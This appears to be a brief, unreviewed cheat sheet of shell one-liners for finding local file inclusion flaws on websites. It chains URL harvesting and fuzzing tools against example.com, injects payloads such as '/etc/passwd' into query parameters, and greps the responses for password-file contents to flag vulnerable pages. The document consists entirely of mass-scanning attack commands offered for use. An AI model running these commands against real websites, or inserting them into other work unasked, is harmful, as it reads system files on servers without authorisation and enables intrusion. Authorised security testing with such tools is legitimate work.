# LFI Testing (not reviewed)

***

### LFI Discovery

#### Basic

```sh
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```

#### with Curl

```sh
gau example.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

#### HTTPX LFI Test

```sh
echo 'https://example.com/index.php?page=' | httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
```
